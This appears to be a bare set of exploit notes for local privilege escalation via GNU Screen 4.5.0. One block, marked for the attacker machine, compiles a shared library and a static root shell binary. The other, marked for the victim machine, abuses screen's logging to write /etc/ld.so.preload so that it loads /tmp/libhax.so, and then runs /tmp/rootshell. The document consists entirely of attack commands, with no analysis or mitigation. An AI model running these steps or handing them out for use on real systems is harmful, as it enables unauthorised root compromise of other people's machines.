### On attacker machine
gcc -fPIC -shared -ldl -o libhax.so libhax.c

gcc --static -o rootshell rootshell.c

### victim machine
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
screen-4.5.0 -ls
ls ld.so.preload
ls -l /tmp/rootshell
/tmp/rootshell
